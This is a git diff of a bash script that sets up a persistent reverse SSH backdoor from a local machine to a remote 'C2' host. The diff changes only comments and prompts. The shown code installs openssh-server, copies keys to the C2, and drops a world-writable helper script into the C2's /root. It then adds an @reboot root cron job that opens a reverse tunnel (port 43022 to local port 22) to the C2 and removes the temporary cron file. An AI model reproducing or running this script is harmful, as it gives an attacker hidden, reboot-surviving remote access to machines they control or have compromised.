@@ -15,7 +15,6 @@ else
     sudo apt update && sudo apt upgrade
     sudo apt install openssh-server
     printf "\n"
-
     echo "### Starting SSH Service & Enabling On Reboot ###"
     sudo systemctl start ssh && sudo systemctl enable ssh
 fi
@@ -26,7 +25,7 @@ fi
     ssh-keygen -b 4096
     printf "\n"
 
-#Read input from user
+#Provide a valid username local to this host for login
     echo "Please enter your local username"
     echo ">>> You will use this user's account to log in from your C2! <<<"
     read user
@@ -38,8 +37,8 @@ fi
     done
     printf "\n"
 
-#Takes input for what remote host you want to route through. 
-    echo "Please enter route to desired C2 host (<username>@<C2_host>)"
+#Takes input for what remote host you want to route through
+    echo "Please enter username/IP for desired C2 host (<username>@<C2_host>)"
     read C2
     printf "\n"
 
@@ -48,7 +47,7 @@ fi
     ssh-copy-id $C2
     printf "\n"
 
-#Generating a remote ssh key
+#Generating an ssh key on your C2
    ssh $C2 'ssh-keygen'
 
 #Creating hmu.sh, which should be run on the C2 host. This file transfers the C2 key back to the host and attaches to the SSH session.
@@ -57,8 +56,8 @@ echo "ssh-copy-id ${user}@localhost -p 43022 && ssh ${user}@localhost -p 43022" 
 sudo chmod 777 /home/$user/hmu_$user.sh 
 scp /home/$user/hmu_$user.sh $C2:/root
 
-#Setup cron job + cleanup
-    echo "### Setting up cronjob ###"
+#Setup local cron job + cleanup
+    echo "### Setting up local cronjob ###"
     echo "@reboot sleep 100 && sudo -u ${user} ssh -f -N -R 43022:localhost:22 ${C2}" >> cronsh
     sudo crontab cronsh
     rm cronsh
